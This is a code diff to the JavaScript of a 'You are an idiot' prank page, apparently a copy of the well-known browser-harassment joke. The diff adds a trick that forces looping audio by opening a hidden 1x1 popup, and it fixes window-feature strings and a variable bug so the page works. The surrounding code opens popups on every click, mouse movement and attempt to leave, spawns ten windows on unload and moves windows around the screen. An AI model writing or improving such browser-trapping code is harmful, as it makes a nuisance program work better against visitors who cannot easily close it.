@@ -5,38 +5,49 @@
 if (top.location != location) {
   top.location.href = location.href;
 }
+
 function reopen() {
   window.open(
     "popup.html",
     "",
-    "blankmenubar=no,status=no,toolbar=noresizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
+    "menubar=no,status=no,toolbar=no,resizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
   );
 }
+
 function spam() {
   for (var i = 0; i < 10; i++) {
     reopen();
   }
   return "You are an idiot!";
 }
-function init() {
-  const audio = new Audio('media/audio/idiot.mp3');
-  audio.loop = true;
-  audio.muted = true;
-  audio.play().then(() => {
-    // Unmute immediately after playing
-    audio.muted = false;
-  }).catch((err) => {
-    console.warn("Autoplay failed:", err);
-  });
 
-  // Original malwarepad behavior
+// 👇 Force audio playback via popup
+function forceAudioPopup() {
+  const popup = window.open("", "", "width=1,height=1");
+  if (popup) {
+    popup.document.write(`
+      <html>
+        <body style="margin:0;padding:0;">
+          <audio src="media/audio/idiot.mp3" autoplay loop></audio>
+        </body>
+      </html>
+    `);
+    popup.document.close();
+  } else {
+    console.warn("Popup blocked — audio not played.");
+  }
+}
+
+function init() {
+  forceAudioPopup(); // 🔊 Attempt to autoplay via popup
+
   document.body.onclick = reopen;
   document.body.onmouseover = reopen;
   document.body.onmousemove = reopen;
   window.onunload = spam;
   window.onbeforeunload = spam;
   playBall();
-  if (bookmark) {
+  if (typeof bookmark === "function") {
     bookmark();
   }
   reopen();
@@ -44,27 +55,34 @@ function init() {
     window.close();
   }, 10000);
 }
+
 var xOff = 5,
   yOff = 5,
   xPos = 400,
   yPos = -100,
   flagRun = true;
+
 function newXlt() {
   xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
   window.focus();
 }
+
 function newXrt() {
   xOff = Math.ceil(7 * Math.random()) * 5 - 10;
 }
+
 function newYup() {
   yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
 }
+
 function newYdn() {
   yOff = Math.ceil(7 * Math.random()) * 5 - 10;
 }
+
 function fOff() {
-  flagrun = false;
+  flagRun = false;
 }
+
 function playBall() {
   xPos += xOff;
   yPos += yOff;
